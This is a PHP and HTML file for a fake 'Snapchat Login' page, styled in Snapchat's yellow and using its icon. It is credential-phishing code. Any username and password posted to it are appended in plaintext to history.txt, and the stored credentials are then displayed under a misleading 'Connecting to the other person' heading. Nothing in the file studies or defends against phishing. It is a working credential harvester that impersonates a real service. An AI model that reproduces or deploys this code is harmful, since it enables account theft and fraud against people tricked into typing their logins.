<?php
$filename = 'history.txt';
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    $entry = "Username: $username, Password: $password\n";
    file_put_contents($filename, $entry, FILE_APPEND);
}
$history = file_get_contents($filename);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Login</title>
    <link rel="icon" href="snapchat-icon.png" type="image/png">
    <style>
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #FFFC00;
            color: #000;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            height: 100vh;
        }
        h1 {
            font-size: 2em;
            color: #000;
            margin-bottom: 20px;
        }
        .history-container {
            background-color: #FFFFFF;
            border-radius: 15px;
            padding: 20px;
            width: 80%;
            max-width: 500px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .entry {
            border-bottom: 1px solid #E8E8E8;
            padding: 10px 0;
            color: #000;
        }
        .entry:last-child {
            border-bottom: none;
        }
        .entry span {
            color: #737373;
        }
    </style>
</head>
<body>
    <h1>Connecting to the other person</h1>
    <div class="history-container">
        <?php
        $entries = explode("\n", trim($history));
        foreach ($entries as $entry) {
            if (!empty($entry)) {
                echo "<div class='entry'>" . nl2br(htmlspecialchars($entry)) . "</div>";
            }
        }
        ?>
    </div>
</body>
</html>
